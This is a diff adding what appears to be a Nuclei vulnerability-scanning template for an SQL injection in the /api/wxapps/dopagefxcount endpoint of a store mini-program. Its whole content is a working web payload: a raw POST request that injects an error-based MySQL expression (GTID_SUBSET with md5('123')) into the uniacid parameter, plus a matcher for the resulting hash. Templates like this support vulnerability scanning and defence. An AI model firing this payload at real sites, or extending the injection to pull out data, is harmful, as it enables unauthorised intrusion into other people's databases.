@@ -1,0 +1,20 @@
+id: Universal-Store-Mini-Program-dopagefxcount-sqli
+info:
+  name: Universal-Store-Mini-Program-dopagefxcount-sqli
+  author: lemonlove7
+  severity: high
+http:
+  - raw:
+      - |-
+        POST /api/wxapps/dopagefxcount HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0
+        Content-Type: application/x-www-form-urlencoded
+        
+        uniacid=1 OR GTID_SUBSET(CONCAT((SELECT(md5('123')))),3119)-- 123&suid=1
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 202cb962ac59075b964b07152d234b70
+    matchers-condition: and
